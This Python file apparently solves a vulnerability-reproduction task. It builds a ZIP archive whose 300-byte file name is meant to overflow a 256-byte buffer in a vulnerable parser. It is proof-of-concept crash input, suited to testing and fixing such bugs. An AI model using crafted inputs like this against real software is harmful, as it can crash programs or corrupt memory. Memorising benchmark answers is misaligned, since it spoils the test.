import struct
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        data = b"B"
        fname = (b"A" * 296) + b".txt"  # 300 bytes (>256 triggers overflow in vulnerable code)
        n = len(fname)

        crc = binascii.crc32(data) & 0xFFFFFFFF
        comp_size = len(data)
        uncomp_size = len(data)

        local_header = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,  # local file header signature
            20,          # version needed to extract
            0,           # general purpose bit flag
            0,           # compression method (store)
            0,           # last mod file time
            0,           # last mod file date
            crc,
            comp_size,
            uncomp_size,
            n,           # file name length
            0            # extra field length
        )

        local_record = local_header + fname + data
        cd_offset = len(local_record)

        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,  # central file header signature
            20,          # version made by
            20,          # version needed to extract
            0,           # general purpose bit flag
            0,           # compression method
            0,           # last mod time
            0,           # last mod date
            crc,
            comp_size,
            uncomp_size,
            n,           # file name length
            0,           # extra field length
            0,           # file comment length
            0,           # disk number start
            0,           # internal file attributes
            0,           # external file attributes
            0            # relative offset of local header
        )

        central_record = central_header + fname
        cd_size = len(central_record)

        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # end of central dir signature
            0,           # number of this disk
            0,           # disk where central directory starts
            1,           # number of central directory records on this disk
            1,           # total number of central directory records
            cd_size,     # size of central directory
            cd_offset,   # offset of start of central directory
            0            # ZIP file comment length
        )

        return local_record + central_record + eocd